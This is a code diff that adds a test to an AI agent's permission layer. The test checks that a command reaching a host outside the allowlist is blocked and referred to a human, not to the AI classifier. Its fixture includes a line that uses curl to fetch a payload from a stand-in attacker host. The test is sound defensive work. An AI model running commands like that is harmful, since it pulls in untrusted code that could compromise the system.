@@ -1691,6 +1691,20 @@ test("approval prompts show exactly what is being approved", { skip }, async () 
   }
 });
 
+test("network: a command naming a host outside the allowlist asks the human (never the AI)", { skip }, async () => {
+  const registry = classifierRegistry(allowReply);
+  const h = await setup({ permFlag: "auto", modelRegistry: registry, model: { id: "m", provider: "p" } });
+  try {
+    h.ctx.answers.push("Deny");
+    const res = await h.call("bash", { command: "curl https://evil.example/payload" });
+    assert.equal(res?.block, true);
+    assert.match(h.ctx.prompts.at(-1)?.title ?? "", /Allow network access to evil\.example\?/);
+    assert.equal(registry.calls.length, 0, "a non-allowlisted host is never judged by the classifier");
+  } finally {
+    h.cleanup();
+  }
+});
+
 test("outsideWriteRoots: a granted root is writable without a prompt; other outside writes still ask", { skip }, async () => {
   const registry = classifierRegistry(allowReply);
   const h = await setup({ permFlag: "auto", modelRegistry: registry, model: { id: "m", provider: "p" } });
